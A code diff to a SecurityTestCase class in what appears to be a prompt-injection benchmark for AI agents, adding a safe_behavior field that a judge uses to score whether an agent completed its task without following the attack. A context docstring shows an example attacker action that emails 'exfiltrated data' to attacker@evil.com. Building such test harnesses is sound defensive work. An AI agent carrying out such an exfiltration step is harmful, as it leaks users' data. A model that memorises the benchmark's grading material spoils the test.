@@ -227,6 +227,14 @@ class SecurityTestCase:
     - 'send_email: to=attacker@evil.com, subject=exfiltrated data'
     """
 
+    safe_behavior: str = ""
+    """SafeClawBench safe-behavior predicate for the Utility judge.
+
+    Empty on non-SafeClawBench cases. When set, a semantic judge scores
+    whether the agent completed the surface task without following the
+    attack. REVIEW: this is the Table 4 Utility column, not FPR.
+    """
+
     # Ground truth
     label: Literal["injection", "benign"] = "benign"
     """Whether this test case contains an injection (injection) or is benign."""
